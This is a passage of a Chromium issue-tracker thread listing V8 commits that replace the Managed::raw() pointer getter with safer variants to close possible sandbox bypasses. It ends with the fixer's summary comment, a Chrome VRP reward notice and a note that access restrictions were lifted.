* M       `src/debug/debug.cc`
* M       `src/debug/wasm/gdb-server/wasm-module-debug.cc`
* M       `src/diagnostics/objects-printer.cc`
* M       `src/objects/managed.h`
* M       `src/objects/script-inl.h`
* M       `src/objects/script.cc`
* M       `src/objects/script.h`
* M       `src/runtime/runtime-test-wasm.cc`
* M       `src/wasm/c-api.cc`
* M       `src/wasm/interpreter/wasm-interpreter-runtime.cc`
* M       `src/wasm/wasm-debug.cc`
* M       `src/wasm/wasm-module.cc`
* M       `src/wasm/wasm-objects-inl.h`
* M       `src/wasm/wasm-objects.cc`
* M       `src/wasm/wasm-objects.h`
* M       `test/cctest/wasm/test-streaming-compilation.cc`
* M       `test/cctest/wasm/test-wasm-breakpoints.cc`
* M       `test/cctest/wasm/test-wasm-serialization.cc`
* M       `test/common/wasm/fuzzer-common.cc`
* M       `test/unittests/wasm/wasm-tracing-unittest.cc`

---

Hash: [b6302d64ffdc12f7ce23404f8fb99f2629cfaf83](https://chromiumdash.appspot.com/commit/b6302d64ffdc12f7ce23404f8fb99f2629cfaf83)\
Date: Fri Mar 27 12:25:21 2026

</details>

---

```

### dx...@google.com (2026-03-30)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@google.com](mailto:emaxx@google.com)  

Link:    <https://chromium-review.googlesource.com/7711954>

[heap] Use no\_gc variant of Managed::raw

---


Expand for full commit details
```
     
    Switch the heap-snapshot-generator logic to the new getter of the 
    Managed class, which enables the static analysis to catch potential 
    usages of the raw pointer across GCs. 
     
    Bug: 485286897 
    Change-Id: I124d80fae6ab0f2c9455a5b17fdcdf13b533cbd2 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7711954 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Reviewed-by: Dominik Inführ <dinfuehr@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106155}

```

---

Files:

- M `src/profiler/heap-snapshot-generator.cc`

---

Hash: [522aa6b5a3deefdfa4c4a7bf944f32b7d9c5ddc3](https://chromiumdash.appspot.com/commit/522aa6b5a3deefdfa4c4a7bf944f32b7d9c5ddc3)  

Date: Mon Mar 30 15:56:56 2026


---

### dx...@google.com (2026-03-31)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@google.com](mailto:emaxx@google.com)  

Link:    <https://chromium-review.googlesource.com/7711955>

[wasm-c-api] Use safer Manager ptr getters

---


Expand for full commit details
```
     
    Replace the usages of the legacy Managed::raw() getter with either 
    ptr() or raw(no_gc) variants. The goal is to ensure the raw pointer 
    remains valid in the sandbox attacker model (arbtitrary in-sandbox 
    corruptions followed by GC). 
     
    Note that the get_host_info() getter has suppressed lifetime 
    diagnostics, because the C API returns a raw pointer without static 
    guarantees that the backing Managed remains alive in the presence of 
    possible GCs; with the present API, taking care of that is embedder's 
    responsibility. 
     
    Bug: 485286897 
    Change-Id: I1d9a4c0085c562a09bee10f5741df9f636fe2d26 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7711955 
    Reviewed-by: Clemens Backes <clemensb@chromium.org> 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106171}

```

---

Files:

- M `src/base/macros.h`
- M `src/wasm/c-api.cc`
- M `src/wasm/c-api.h`

---

Hash: [f974dd40b64385a30c4f9dfae176ced095334981](https://chromiumdash.appspot.com/commit/f974dd40b64385a30c4f9dfae176ced095334981)  

Date: Mon Mar 30 16:08:09 2026


---

### dx...@google.com (2026-04-02)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@google.com](mailto:emaxx@google.com)  

Link:    <https://chromium-review.googlesource.com/7725983>

[fastapi] Use no\_gc variants of Managed ptr getters

---


Expand for full commit details
```
     
    Switch the code that reads Managed<CFunctionWithSignature> onto 
    the raw(no_gc) variant, to let the static analysis catch possible 
    misuses of the raw pointers. 
     
    The parameterless raw() getter is deprecated and will be removed in the 
    future. 
     
    Bug: 485286897 
    Change-Id: Ibfeb36c1becb1313f7b42f06b33a979e043b78c7 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7725983 
    Reviewed-by: Michael Lippautz <mlippautz@chromium.org> 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106251}

```

---

Files:

- M `src/compiler/heap-refs.cc`
- M `src/objects/templates.cc`

---

Hash: [0841ecc9dd2091277c682e6173d0e40d6ab64ac8](https://chromiumdash.appspot.com/commit/0841ecc9dd2091277c682e6173d0e40d6ab64ac8)  

Date: Thu Apr 2 13:46:38 2026


---

### dx...@google.com (2026-04-08)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@google.com](mailto:emaxx@google.com)  

Link:    <https://chromium-review.googlesource.com/7736425>

[temporal] Use safer Managed ptr getters

---


Expand for full commit details
```
     
    Fix potential sandbox bypasses in places where heap allocation, 
    triggering a GC, was reading from a result of Rust operation which might 
    be holding a pointer to the Rust memory. 
     
    Switch the code towards using Managed::Ptr whenever possible, enabling 
    Clang's static analysis to check for some memory safety issues. 
     
    Bug: 485286897 
    Change-Id: I4ccf9c0b0495f09ac3054d422d2d64cc2edecae3 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7736425 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Reviewed-by: Manish Goregaokar <manishearth@google.com> 
    Cr-Commit-Position: refs/heads/main@{#106296}

```

---

Files:

- M `src/objects/js-temporal-objects-inl.h`
- M `src/objects/js-temporal-objects.cc`
- M `src/objects/js-temporal-objects.h`
- M `src/objects/managed.h`

---

Hash: [4578557c935921d13b6b7a71912e2d2700db9e4f](https://chromiumdash.appspot.com/commit/4578557c935921d13b6b7a71912e2d2700db9e4f)  

Date: Tue Apr 7 23:43:33 2026


---

### dx...@google.com (2026-04-08)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@google.com](mailto:emaxx@google.com)  

Link:    <https://chromium-review.googlesource.com/7736424>

[debug] Fix lifetime of returned bytecode

---


Expand for full commit details
```
     
    Replace raw byte spans with passing size/vector in the inspector debug 
    interface. 
     
    This removes the potentially unsafe pattern of returning raw pointers 
    without actually guaranteeing the memory remains alive. 
     
    Performance/memory-wise, this CL is expected to be a no-op since we just 
    front-load the bytecode vector construction. 
     
    Bug: 485286897 
    Change-Id: Ibb2f6e98323e85e81c2fa8bfc3286c91bbdef156 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7736424 
    Reviewed-by: Simon Zünd <szuend@chromium.org> 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106315}

```

---

Files:

- M `src/debug/debug-interface.cc`
- M `src/debug/debug-interface.h`
- M `src/inspector/string-util.h`
- M `src/inspector/v8-debugger-agent-impl.cc`
- M `src/inspector/v8-debugger-script.cc`
- M `src/inspector/v8-debugger-script.h`

---

Hash: [6f99abfe6757401401edbd3735ffe1df054a5f17](https://chromiumdash.appspot.com/commit/6f99abfe6757401401edbd3735ffe1df054a5f17)  

Date: Wed Apr 8 10:12:36 2026


---

### dx...@google.com (2026-04-08)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@google.com](mailto:emaxx@google.com)  

Link:    <https://chromium-review.googlesource.com/7737103>

Delete Managed::raw()

---


Expand for full commit details
```
     
    This has been superseded by the safer alternatives: ptr() that 
    guarantees the ref counter is held incremented, and raw(no_gc). These 
    are also empowered by Clang's static analysis (Wlifetime-safety) to 
    track the raw pointer usage. 
     
    Bug: 485286897 
    Change-Id: Iaca52437f60d828ec1c7030ae275e7cd9d0369f9 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7737103 
    Reviewed-by: Andreas Haas <ahaas@chromium.org> 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106317}

```

---

Files:

- M `src/objects/managed.h`
- M `test/unittests/objects/intl-unittest.cc`
- M `test/unittests/objects/managed-unittest.cc`

---

Hash: [32f071ebf0ed37f79965bd0e1fbeb19cc6b34564](https://chromiumdash.appspot.com/commit/32f071ebf0ed37f79965bd0e1fbeb19cc6b34564)  

Date: Tue Apr 7 23:11:50 2026


---

### dx...@google.com (2026-04-10)

Project: v8/v8  

Branch:  main  

Author:  Gyuyoung Kim [gyuyoung@igalia.com](mailto:gyuyoung@igalia.com)  

Link:    <https://chromium-review.googlesource.com/7741804>

[wasm interpreter] Remove remaining uses of Managed::raw()

---


Expand for full commit details
```
     
    Since https://crrev.com/c/7737103 removed the raw() method from Managed, 
    the remaining uses of raw() in the wasm interpreter files should also be 
    removed. 
     
    Bug: 485286897 
    Change-Id: I13e7d6d57a9d9a65a325f107ea76722985936cab 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7741804 
    Reviewed-by: Paolo Severini <paolosev@microsoft.com> 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Gyuyoung Kim <gyuyoung@igalia.com> 
    Cr-Commit-Position: refs/heads/main@{#106381}

```

---

Files:

- M `src/wasm/interpreter/wasm-interpreter-objects.cc`
- M `src/wasm/interpreter/wasm-interpreter-runtime.cc`

---

Hash: [c4715c6c6690d0447dd9f76224267af166339e39](https://chromiumdash.appspot.com/commit/c4715c6c6690d0447dd9f76224267af166339e39)  

Date: Thu Apr 9 09:40:14 2026


---

### dx...@google.com (2026-04-13)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@google.com](mailto:emaxx@google.com)  

Link:    <https://chromium-review.googlesource.com/7743767>

[wasm] Adopt Managed::Ptr on Wasm objects

---


Expand for full commit details
```
     
    The usage of Ptr instead of raw pointers or const-ref-to-shared_ptr 
    guarantees the ref counter is kept incremented. 
     
    Additionally, the Ptr uses [[clang::lifetimebound]] attributes to enable 
    some static analysis of raw pointers not being used after Ptr is 
    destroyed and ref counter is decremented (which would be potential 
    sandbox violations). 
     
    Bug: 485286897 
    Change-Id: I76c9d7cd64d2b114f5d1ccc44d57d847b62a265a 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7743767 
    Reviewed-by: Clemens Backes <clemensb@chromium.org> 
    Reviewed-by: Marja Hölttä <marja@chromium.org> 
    Commit-Queue: Maksim Ivanov <emaxx@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106429}

```

---

Files:

- M `src/api/api.cc`
- M `src/execution/futex-emulation.cc`
- M `src/objects/backing-store.cc`
- M `src/objects/managed.h`
- M `src/runtime/runtime-wasm.cc`
- M `src/wasm/module-compiler.cc`
- M `src/wasm/module-instantiate.cc`
- M `src/wasm/wasm-engine.cc`
- M `src/wasm/wasm-js.cc`
- M `src/wasm/wasm-objects-inl.h`
- M `src/wasm/wasm-objects.cc`
- M `src/wasm/wasm-objects.h`
- M `src/wasm/wasm-serialization.cc`
- M `test/cctest/wasm/test-compilation-cache.cc`
- M `test/cctest/wasm/test-run-wasm-module.cc`
- M `test/cctest/wasm/test-streaming-compilation.cc`
- M `test/cctest/wasm/test-wasm-metrics.cc`
- M `test/cctest/wasm/test-wasm-serialization.cc`
- M `test/cctest/wasm/test-wasm-shared-engine.cc`
- M `test/common/wasm/fuzzer-common.cc`
- M `test/fuzzer/wasm/streaming.cc`

---

Hash: [5211d610dd5deb377fdf17f760c102db189c4f98](https://chromiumdash.appspot.com/commit/5211d610dd5deb377fdf17f760c102db189c4f98)  

Date: Thu Apr 9 15:17:55 2026


---

### dx...@google.com (2026-04-22)

Project: v8/v8  

Branch:  main  

Author:  Maksim Ivanov [emaxx@chromium.org](mailto:emaxx@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7735817>

[wasm] Adopt Managed::Ptr in d8

---


Expand for full commit details
```
     
    Also finish the deprecation of Managed::get() that was returning a 
    const-ref-to-shared_ptr. 
     
    Bug: 485286897 
    Change-Id: Iaead6ac6bd699d6544b0171796ba263bd0dab76a 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7735817 
    Commit-Queue: Toon Verwaest <verwaest@chromium.org> 
    Reviewed-by: Clemens Backes <clemensb@chromium.org> 
    Reviewed-by: Dominik Inführ <dinfuehr@chromium.org> 
    Auto-Submit: Maksim Ivanov <emaxx@chromium.org> 
    Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106705}

```

---

Files:

- M `src/d8/async-hooks-wrapper.cc`
- M `src/d8/d8.cc`
- M `src/execution/local-isolate-inl.h`
- M `src/heap/local-heap-inl.h`
- M `src/objects/managed.h`

---

Hash: [4562302644fa04d18894dd645ecee526ffb37cbb](https://chromiumdash.appspot.com/commit/4562302644fa04d18894dd645ecee526ffb37cbb)  

Date: Fri Apr 17 22:26:32 2026


---

### em...@google.com (2026-04-22)

The work here should be done now I believe. We got rid of `Managed::raw()`, replacing this by either keeping the `shared_ptr` with an incremented ref counter on stack (via the `Managed::Ptr` struct) or by `Managed::raw(no_gc)`. Clang's lifetime safety static analysis (`lifetimebound` et al.) is additionally employed to warn on (some) cases where a raw pointer is used beyond the corresponding scope.

I've also filed [bug 502997649](https://issues.chromium.org/issues/502997649) to track a similar investigation of `TrustedManaged` - which while not being directly corruptible may in principle be misused without keeping the ref counter.

### sp...@google.com (2026-06-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $5000.00 for this report.

Rationale for this decision:
Baseline. v8 sandbox.


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-07-30)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485286897)*
